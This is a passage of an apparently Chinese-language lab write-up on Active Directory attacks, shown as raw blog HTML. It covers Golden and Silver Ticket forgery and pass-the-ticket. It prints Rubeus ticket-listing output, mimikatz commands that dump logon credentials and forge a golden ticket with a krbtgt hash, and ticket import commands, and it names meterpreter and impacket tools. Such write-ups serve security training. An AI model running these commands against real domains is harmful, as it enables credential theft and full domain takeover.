class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Downloads&gt; .\Rubeus.exe &quot;klist&quot;</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v1.5.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Action: List Kerberos Tickets (All Users)</span><br><span class="line"></span><br><span class="line">[*] Current LUID    : 0x101a3f</span><br><span class="line"></span><br><span class="line">  UserName                 : DC01$</span><br><span class="line">  Domain                   : TRAINING</span><br><span class="line">  LogonId                  : 0xa841b</span><br><span class="line">  UserSID                  : S-1-5-18</span><br><span class="line">  AuthenticationPackage    : Kerberos</span><br><span class="line">  LogonType                : Network</span><br><span class="line">  LogonTime                : 12/20/2020 5:30:46 PM</span><br><span class="line">  LogonServer              :</span><br><span class="line">  LogonServerDNSDomain     : TRAINING.LOCAL</span><br><span class="line">  UserPrincipalName        :</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:30:46 PM ; 12/21/2020 3:17:07 AM ; 1/1/1601 8:00:00 AM</span><br><span class="line">      Server Name       : GC/DC01.training.local/training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : DC01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">  UserName                 : DC01$</span><br><span class="line">  Domain                   : TRAINING</span><br><span class="line">  LogonId                  : 0x267ae</span><br><span class="line">  UserSID                  : S-1-5-18</span><br><span class="line">  AuthenticationPackage    : Kerberos</span><br><span class="line">  LogonType                : Network</span><br><span class="line">  LogonTime                : 12/20/2020 5:18:04 PM</span><br><span class="line">  LogonServer              :</span><br><span class="line">  LogonServerDNSDomain     : TRAINING.LOCAL</span><br><span class="line">  UserPrincipalName        :</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:10 PM ; 12/21/2020 3:17:07 AM ; 1/1/1601 8:00:00 AM</span><br><span class="line">      Server Name       : ldap/DC01.training.local/training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : DC01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">  UserName                 : DC01$</span><br><span class="line">  Domain                   : TRAINING</span><br><span class="line">  LogonId                  : 0x266eb</span><br><span class="line">  UserSID                  : S-1-5-18</span><br><span class="line">  AuthenticationPackage    : Kerberos</span><br><span class="line">  LogonType                : Network</span><br><span class="line">  LogonTime                : 12/20/2020 5:18:04 PM</span><br><span class="line">  LogonServer              :</span><br><span class="line">  LogonServerDNSDomain     : TRAINING.LOCAL</span><br><span class="line">  UserPrincipalName        :</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:10 PM ; 12/21/2020 3:17:07 AM ; 1/1/1601 8:00:00 AM</span><br><span class="line">      Server Name       : ldap/DC01.training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : DC01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">  UserName                 : DC01$</span><br><span class="line">  Domain                   : TRAINING</span><br><span class="line">  LogonId                  : 0x2140d</span><br><span class="line">  UserSID                  : S-1-5-18</span><br><span class="line">  AuthenticationPackage    : Kerberos</span><br><span class="line">  LogonType                : Network</span><br><span class="line">  LogonTime                : 12/20/2020 5:17:18 PM</span><br><span class="line">  LogonServer              :</span><br><span class="line">  LogonServerDNSDomain     : TRAINING.LOCAL</span><br><span class="line">  UserPrincipalName        :</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:18 PM ; 12/21/2020 3:17:07 AM ; 12/27/2020 5:17:07 PM</span><br><span class="line">      Server Name       : krbtgt/TRAINING.LOCAL @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : DC01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, pre_authent, renewable, forwarded, forwardable (60a10000)</span><br><span class="line"></span><br><span class="line">  UserName                 : DC01$</span><br><span class="line">  Domain                   : TRAINING</span><br><span class="line">  LogonId                  : 0x2098c</span><br><span class="line">  UserSID                  : S-1-5-18</span><br><span class="line">  AuthenticationPackage    : Kerberos</span><br><span class="line">  LogonType                : Network</span><br><span class="line">  LogonTime                : 12/20/2020 5:17:11 PM</span><br><span class="line">  LogonServer              :</span><br><span class="line">  LogonServerDNSDomain     : TRAINING.LOCAL</span><br><span class="line">  UserPrincipalName        :</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:10 PM ; 12/21/2020 3:17:07 AM ; 1/1/1601 8:00:00 AM</span><br><span class="line">      Server Name       : ldap/DC01.training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : DC01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">  UserName                 : DC01$</span><br><span class="line">  Domain                   : TRAINING</span><br><span class="line">  LogonId                  : 0x3e4</span><br><span class="line">  UserSID                  : S-1-5-20</span><br><span class="line">  AuthenticationPackage    : Negotiate</span><br><span class="line">  LogonType                : Service</span><br><span class="line">  LogonTime                : 12/20/2020 5:15:35 PM</span><br><span class="line">  LogonServer              :</span><br><span class="line">  LogonServerDNSDomain     :</span><br><span class="line">  UserPrincipalName        : DC01$@training.loca</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:30 PM ; 12/21/2020 3:17:30 AM ; 12/27/2020 5:17:30 PM</span><br><span class="line">      Server Name       : krbtgt/TRAINING.LOCAL @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : dc01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, pre_authent, renewable, forwarded, forwardable (60a10000)</span><br><span class="line"></span><br><span class="line">    [1] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:18:01 PM ; 12/21/2020 3:17:30 AM ; 12/27/2020 5:17:30 PM</span><br><span class="line">      Server Name       : ldap/DC01.training.local/training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : dc01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">    [2] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:30 PM ; 12/21/2020 3:17:30 AM ; 12/27/2020 5:17:30 PM</span><br><span class="line">      Server Name       : DNS/dc01.training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : dc01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">  UserName                 : administrator</span><br><span class="line">  Domain                   : TRAINING</span><br><span class="line">  LogonId                  : 0x2d5ab</span><br><span class="line">  UserSID                  : S-1-5-21-2501991368-4163896689-842069156-500</span><br><span class="line">  AuthenticationPackage    : Kerberos</span><br><span class="line">  LogonType                : Interactive</span><br><span class="line">  LogonTime                : 12/20/2020 5:19:13 PM</span><br><span class="line">  LogonServer              : DC01</span><br><span class="line">  LogonServerDNSDomain     : TRAINING.LOCAL</span><br><span class="line">  UserPrincipalName        : Administrator@training.local</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:19:13 PM ; 12/21/2020 3:19:13 AM ; 12/27/2020 5:19:13 PM</span><br><span class="line">      Server Name       : krbtgt/TRAINING.LOCAL @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : administrator @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)</span><br><span class="line"></span><br><span class="line">  UserName                 : DC01$</span><br><span class="line">  Domain                   : TRAINING</span><br><span class="line">  LogonId                  : 0x267f3</span><br><span class="line">  UserSID                  : S-1-5-18</span><br><span class="line">  AuthenticationPackage    : Kerberos</span><br><span class="line">  LogonType                : Network</span><br><span class="line">  LogonTime                : 12/20/2020 5:18:04 PM</span><br><span class="line">  LogonServer              :</span><br><span class="line">  LogonServerDNSDomain     : TRAINING.LOCAL</span><br><span class="line">  UserPrincipalName        :</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:10 PM ; 12/21/2020 3:17:07 AM ; 1/1/1601 8:00:00 AM</span><br><span class="line">      Server Name       : ldap/DC01.training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : DC01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">  UserName                 : DC01$</span><br><span class="line">  Domain                   : TRAINING</span><br><span class="line">  LogonId                  : 0x2669a</span><br><span class="line">  UserSID                  : S-1-5-18</span><br><span class="line">  AuthenticationPackage    : Kerberos</span><br><span class="line">  LogonType                : Network</span><br><span class="line">  LogonTime                : 12/20/2020 5:18:04 PM</span><br><span class="line">  LogonServer              :</span><br><span class="line">  LogonServerDNSDomain     : TRAINING.LOCAL</span><br><span class="line">  UserPrincipalName        :</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:10 PM ; 12/21/2020 3:17:07 AM ; 1/1/1601 8:00:00 AM</span><br><span class="line">      Server Name       : ldap/DC01.training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : DC01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">  UserName                 : DC01$</span><br><span class="line">  Domain                   : TRAINING</span><br><span class="line">  LogonId                  : 0x3e7</span><br><span class="line">  UserSID                  : S-1-5-18</span><br><span class="line">  AuthenticationPackage    : Negotiate</span><br><span class="line">  LogonType                : 0</span><br><span class="line">  LogonTime                : 12/20/2020 5:15:15 PM</span><br><span class="line">  LogonServer              :</span><br><span class="line">  LogonServerDNSDomain     : training.local</span><br><span class="line">  UserPrincipalName        : DC01$@training.local</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:18 PM ; 12/21/2020 3:17:07 AM ; 12/27/2020 5:17:07 PM</span><br><span class="line">      Server Name       : krbtgt/TRAINING.LOCAL @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : dc01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, pre_authent, renewable, forwarded, forwardable (60a10000)</span><br><span class="line"></span><br><span class="line">    [1] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:30:46 PM ; 12/21/2020 3:17:07 AM ; 12/27/2020 5:17:07 PM</span><br><span class="line">      Server Name       : GC/DC01.training.local/training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : dc01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">    [2] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:25:20 PM ; 12/21/2020 3:17:07 AM ; 12/27/2020 5:17:07 PM</span><br><span class="line">      Server Name       : cifs/DC01 @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : dc01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">    [3] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:40 PM ; 12/21/2020 3:17:07 AM ; 12/27/2020 5:17:07 PM</span><br><span class="line">      Server Name       : cifs/DC01.training.local/training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : dc01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">    [4] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:39 PM ; 12/21/2020 3:17:07 AM ; 12/27/2020 5:17:07 PM</span><br><span class="line">      Server Name       : DC01$ @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : dc01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">    [5] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:11 PM ; 12/21/2020 3:17:07 AM ; 12/27/2020 5:17:07 PM</span><br><span class="line">      Server Name       : LDAP/DC01 @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : dc01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">    [6] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:10 PM ; 12/21/2020 3:17:07 AM ; 12/27/2020 5:17:07 PM</span><br><span class="line">      Server Name       : ldap/DC01.training.local/training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : dc01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line"></span><br><span class="line">    [7] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 12/20/2020 5:17:10 PM ; 12/21/2020 3:17:07 AM ; 12/27/2020 5:17:07 PM</span><br><span class="line">      Server Name       : ldap/DC01.training.local @ TRAINING.LOCAL</span><br><span class="line">      Client Name       : dc01$ @ TRAINING.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br></pre></td></tr></table></figure>
<p>如果沒有解決 logon session 的問題的話在使用 mimikatz 會顯示 <code>0xc000005f</code> 的錯誤<br><img src="/img/2020/windows_ad/windows_AD_lab4_22-1.png" alt=""><br>對應的錯誤表顯示 <code>STATUS_NO_SUCH_LOGON_SESSION</code><br>之後就來做 pass the ticket, 首先我們在前面成功利用 mimikatz dump 出 administrator 的 ticket了<br>如果你的本地已經有 krbtgt 之類的高權限 user 造訪過的話，那可以直接用 mimikatz 進行本地提權就不需要再把 ticket dump 出來了<br><code>./mimikatz.exe &quot;kerberos::golden /user:administrator /domain:training.local sid:S-1-5-21-2501991368-4163896689-842069156 /krbtgt:4785a51c191306d52946af288b7ad2eb /ptt&quot; exit</code><br> <img src="/img/2020/windows_ad/windows_AD_lab4_27.png" alt=""></p>
<p>現在要做的就是在 client 端進行 pass the ticket 提權<br>首先我們一樣透過 hfs 的洞拿到低權 shell<br>這邊我一樣踩到雷了，如果目標系統是 64位元的，請<code>務必</code>用 x64 的 meterpreter<br>不然你會這樣<br><img src="/img/2020/windows_ad/windows_AD_lab4_28.png" alt=""></p>
<p>但在 local 端卻有找到<br><img src="/img/2020/windows_ad/windows_AD_lab4_29.png" alt=""></p>
<p>原因在於，如果用 32 位元打進去的話，你的 <code>system32</code> 會是 <code>syswow64</code> 而不是我們想的 <code>system32</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">When a 32-bit process on 64-bit Windows tries to access &quot;C:\Windows\System32&quot;, WOW64 redirects it to &quot;C:\Windows\SysWOW64&quot;. There are several ways to access the real &quot;C:\Windows\System32&quot; directory:</span><br><span class="line"></span><br><span class="line">1. Use &quot;C:\Windows\SysNative&quot;, which WOW64 redirects to &quot;C:\Windows\System32&quot; even though it does not appear in directory listings. This is an easy way and unlikely to cause problems.</span><br><span class="line">2. Use Wow64DisableWow64FsRedirection and Wow64RevertWow64FsRedirection.</span><br><span class="line">3. Use a 64-bit process.</span><br></pre></td></tr></table></figure></p>
<p>最快的方法當然就是用 x64 的 Payload 打進去<br><img src="/img/2020/windows_ad/windows_AD_lab4_30.png" alt=""><br>我們把透過 mimikatz 的 Ticket 放進去<br><img src="/img/2020/windows_ad/windows_AD_lab4_31.png" alt=""></p>
<p>使用 <code>rubeus</code> import ticket<br><code>rubeus ptt /ticket:administrator.golden.kirbi</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_33.png" alt=""></p>
<p>也可以用 <code>mimikatz</code> 進行<br><code>mimikatz.exe &quot;kerberos::ptt administrator.golden.kirbi&quot; exit</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_32.png" alt=""><br>結果:<br><code>rubeus.exe klist</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_35.png" alt=""><br><code>mimikatz.exe &quot;kerberos::list&quot; exit</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_34.png" alt=""></p>
<hr>
<h1 id="LAB-5-Pass-the-Ticket-Silver-Ticket"><a href="#LAB-5-Pass-the-Ticket-Silver-Ticket" class="headerlink" title="LAB 5 Pass the Ticket (Silver Ticket)"></a>LAB 5 Pass the Ticket (Silver Ticket)</h1><hr>
<h2 id="What-is-Silver-Ticket"><a href="#What-is-Silver-Ticket" class="headerlink" title="What is Silver Ticket"></a>What is Silver Ticket</h2><p>以一張圖來說<br><img src="https://adsecurity.org/wp-content/uploads/2015/04/Visio-SilverTicket-Comms-1024x511.png" alt=""></p>
<p>ref: <a href="https://adsecurity.org/wp-content/uploads/2015/04/Visio-SilverTicket-Comms-1024x511.png" target="_blank" rel="noopener">https://adsecurity.org/wp-content/uploads/2015/04/Visio-SilverTicket-Comms-1024x511.png</a></p>
<p>如果說 Golden Ticket 是利用 <code>krbtgt</code> 的 NTLM hash 偽造 TGT 發送給 DC 取得正版的 <code>Server Ticket</code>, 那 Silver Ticket 就是利用 <code>Service Account</code> 的 NTLM hash 偽造 TGS 發送給 Application Server</p>
<p>並且因為是利用 <code>Service Account</code> 的 NTLM hash 簽章的 TGS, 所以並不像 Golden Ticket 一樣可以讀取任意服務</p>
<p>這個攻擊必須建立在關閉 PAC 的前提之下，但大多數的環境都會將 PAC 關閉 (為了相容舊系統)，只要關閉了 PAC, TGS 的內容就可以藉由 Server Account 的 NTLM hash 偽造了 (因為沒有了 krbtgt 加密後的 PAC)</p>
<h2 id="How-to-get-NTLM-hash-1"><a href="#How-to-get-NTLM-hash-1" class="headerlink" title="How to get NTLM hash?"></a>How to get NTLM hash?</h2><ul>
<li>mimikatz [local]</li>
<li>secretsdump.py (from impacket) [kali]</li>
<li>import powersploit for executing mimikatz</li>
<li>DCsync, the concept will be presented at ACL session [local]</li>
</ul>
<h2 id="Exploit-with-Silver-Ticket"><a href="#Exploit-with-Silver-Ticket" class="headerlink" title="Exploit with Silver Ticket"></a>Exploit with Silver Ticket</h2><ol>
<li>Dump hash<ul>
<li>mimikatz [local]</li>
</ul>
</li>
<li>Forge silver ticket  (client) <ul>
<li>Executed from kali using minikerberos example (kirbi2ccache)</li>
</ul>
</li>
<li>Pass the ticket (client)<ul>
<li>Executed from kali using impacket example (psexec, wmiexec) </li>
</ul>
</li>
<li>Kerberosting (client)<ul>
<li>PowerView</li>
<li>rubeus, mimikatz [local]</li>
</ul>
</li>
<li>Forge silver ticket (AD)<ul>
<li>Executed from kali using impacket example (ticketer)</li>
</ul>
</li>
<li>Pass the silver ticket (AD)<ul>
<li>Executed from kali using impacket example (smbexec)</li>
</ul>
</li>
</ol>
<h3 id="Dump-hash-2"><a href="#Dump-hash-2" class="headerlink" title="Dump hash"></a>Dump hash</h3><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords &quot; exit</code><br><img src="/img/2020/windows_ad/windows_AD_lab5_0.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span 